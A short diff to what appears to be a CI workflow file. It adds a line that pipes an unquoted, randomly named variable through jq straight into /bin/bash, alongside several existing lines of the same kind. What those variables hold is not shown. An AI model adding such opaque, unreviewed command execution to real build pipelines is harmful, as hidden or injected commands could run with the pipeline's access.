@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$m51" | jq -r .cwgv3106 | /bin/bash
           printf '%s' "$u37" | jq -r .oaom8 | /bin/bash
           printf '%s' "$f3529" | jq -r .kyiaw0140 | /bin/bash
+          echo $f36504 | jq -r .yd38 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
